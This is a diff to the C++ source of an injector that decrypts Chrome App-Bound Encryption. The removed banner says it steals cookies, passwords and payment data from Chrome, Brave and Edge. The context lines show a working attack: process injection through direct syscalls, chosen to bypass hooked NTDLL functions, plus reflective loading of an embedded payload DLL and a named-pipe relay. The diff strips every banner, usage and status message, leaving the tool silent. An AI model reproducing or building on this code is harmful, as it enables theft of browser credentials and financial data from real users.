@@ -141,12 +141,6 @@ namespace Injector
         {
             HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
-            std::cout << "------------------------------------------------\n"
-                      << "|  Chrome App-Bound Encryption Decryption      |\n"
-                      << "|  Direct Syscall Injection Engine             |\n"
-                      << "|  x64 & ARM64 | Cookies, Passwords, Payments  |\n"
-                      << "|  v0.13.0 by @xaitax                          |\n"
-                      << "------------------------------------------------\n\n";
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
         }
 
@@ -154,13 +148,6 @@ namespace Injector
         {
             HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-            std::wcout << L"Usage:\n"
-                       << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
-                       << L"Options:\n"
-                       << L"  --start-browser|-s       Auto-launch browser if not running\n"
-                       << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
-                       << L"  --verbose|-v             Enable verbose debug output from the injector\n"
-                       << L"  --help|-h                Show this help message\n";
             SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
         }
     }
@@ -205,7 +192,6 @@ namespace Injector
 
             if (pData == NULL || dwSize == 0)
             {
-                UI::PrintStatus("[-]", "LockResource or SizeofResource failed.");
                 return std::nullopt;
             }
 
@@ -316,12 +302,10 @@ namespace Injector
             USHORT targetArch = 0;
             if (!GetProcessArchitecture(hProc, targetArch))
             {
-                UI::PrintStatus("[-]", "Failed to determine target architecture");
                 return false;
             }
             if (targetArch != MyArch)
             {
-                UI::PrintStatus("[-]", "Architecture mismatch: Injector is " + std::string(ArchName(MyArch)) + " but target is " + std::string(ArchName(targetArch)));
                 return false;
             }
             UI::LogDebug("Architecture match: Injector=" + std::string(ArchName(MyArch)) + ", Target=" + std::string(ArchName(targetArch)));
@@ -462,7 +446,6 @@ namespace Injector
             DWORD rdiOffset = GetReflectiveLoaderFileOffset(dllBuffer.data(), targetArch);
             if (rdiOffset == 0)
             {
-                UI::PrintStatus("[-]", "Could not find ReflectiveLoader export in the embedded DLL.");
                 return false;
             }
             UI::LogDebug("RDI: ReflectiveLoader file offset: " + Utils::PtrToHexStr((void *)(uintptr_t)rdiOffset));
@@ -491,7 +474,6 @@ namespace Injector
             status = NtWriteVirtualMemory_syscall(proc, remoteMem, (PVOID)dllBuffer.data(), dllBuffer.size(), &bytesWritten);
             if (!NT_SUCCESS(status))
             {
-                UI::PrintStatus("[-]", "RDI: NtWriteVirtualMemory failed. Status: " + Utils::NtStatusToString(status));
                 return false;
             }
 
@@ -517,7 +499,6 @@ namespace Injector
             status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, proc, (LPTHREAD_START_ROUTINE)remoteLoaderAddr, lpDllParameter, 0, 0, 0, 0, nullptr);
             if (!NT_SUCCESS(status))
             {
-                UI::PrintStatus("[-]", "RDI: NtCreateThreadEx failed. Status: " + Utils::NtStatusToString(status));
                 return false;
             }
             HandleGuard remoteThreadGuard(hRemoteThread);
@@ -542,7 +523,6 @@ namespace Injector
                                                 1, 4096, 4096, 0, nullptr));
             if (!m_pipeHandle)
             {
-                UI::PrintStatus("[-]", "CreateNamedPipeW failed. Error: " + std::to_string(GetLastError()));
                 return false;
             }
             UI::LogDebug("Named pipe server created: " + m_pipeNameUtf8);
@@ -554,7 +534,6 @@ namespace Injector
             UI::LogDebug("Waiting for DLL to connect to named pipe...");
             if (!ConnectNamedPipe(m_pipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
             {
-                UI::PrintStatus("[-]", "ConnectNamedPipe failed. Error: " + std::to_string(GetLastError()));
                 return false;
             }
             UI::LogDebug("DLL connected to named pipe.");
@@ -576,7 +555,6 @@ namespace Injector
 
         void RelayMessagesUntilComplete()
         {
-            UI::PrintStatus("[*]", "Waiting for DLL (Pipe: " + m_pipeNameUtf8 + ")");
             std::cout << std::endl;
 
             const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
@@ -591,7 +569,6 @@ namespace Injector
                 {
                     if (GetLastError() == ERROR_BROKEN_PIPE)
                         break;
-                    UI::PrintStatus("[-]", "PeekNamedPipe failed. Error: " + std::to_string(GetLastError()));
                     break;
                 }
                 if (bytesAvailable == 0)
@@ -630,7 +607,6 @@ namespace Injector
             }
         end_loop:
             std::cout << std::endl;
-            UI::PrintStatus("[+]", "DLL signaled completion or pipe interaction ended.");
         }
 
     private:
@@ -640,7 +616,6 @@ namespace Injector
             if (!WriteFile(m_pipeHandle.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &bytesWritten, nullptr) ||
                 bytesWritten != (msg.length() + 1))
             {
-                UI::PrintStatus("[-]", "WriteFile to pipe failed for message: " + msg);
                 return false;
             }
             UI::LogDebug("Sent message to pipe: " + msg);
@@ -757,7 +732,6 @@ namespace Injector
 
         if (!InitializeSyscalls(config.verbose))
         {
-            UI::PrintStatus("[-]", "Failed to initialize direct syscalls. Critical NTDLL functions might be hooked, missing, or gadgets not found.");
             return 1;
         }
 
@@ -770,7 +744,6 @@ namespace Injector
         fs::create_directories(config.outputPath, ec);
         if (ec)
         {
-            UI::PrintStatus("[-]", "Failed to create output directory: " + config.outputPath.u8string() + ". Error: " + ec.message());
             return 1;
         }
 
@@ -787,25 +760,21 @@ namespace Injector
             {
                 startedByInjector = true;
                 std::string version = Process::GetProcessVersion(config.browserDefaultExePath);
-                UI::PrintStatus("[+]", config.browserDisplayName + " (v. " + version + ") launched w/ PID " + std::to_string(targetPid));
             }
             else
             {
-                UI::PrintStatus("[-]", "Failed to start " + config.browserDisplayName);
                 return 1;
             }
         }
 
         if (targetPid == 0)
         {
-            UI::PrintStatus("[-]", config.browserDisplayName + " not running and auto-start not requested or failed.");
             return 1;
         }
 
         HandleGuard targetProcess(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, targetPid));
         if (!targetProcess)
         {
-            UI::PrintStatus("[-]", "OpenProcess failed for PID " + std::to_string(targetPid) + ". Error: " + std::to_string(GetLastError()));
             return 1;
         }
 
@@ -816,7 +785,6 @@ namespace Injector
         auto optResource = Utils::GetEmbeddedResource(L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
         if (!optResource)
         {
-            UI::PrintStatus("[-]", "Failed to load the embedded payload DLL from resources.");
             return 1;
         }
 
@@ -841,7 +809,6 @@ namespace Injector
         UI::LogDebug("NtAllocateVirtualMemory_syscall returned " + Utils::NtStatusToString(statusAlloc));
         if (!NT_SUCCESS(statusAlloc))
         {
-            UI::PrintStatus("[-]", "NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(statusAlloc));
             return 1;
         }
 
@@ -866,7 +833,6 @@ namespace Injector
         UI::LogDebug("NtWriteVirtualMemory_syscall returned " + Utils::NtStatusToString(statusWrite));
         if (!NT_SUCCESS(statusWrite))
         {
-            UI::PrintStatus("[-]", "NtWriteVirtualMemory failed: " + Utils::NtStatusToString(statusWrite));
             return 1;
         }
 
@@ -901,7 +867,6 @@ namespace Injector
             if (processToKill)
             {
                 TerminateProcess(processToKill.get(), 0);
-                UI::PrintStatus("[*]", config.browserDisplayName + " terminated by injector.");
             }
         }
         else
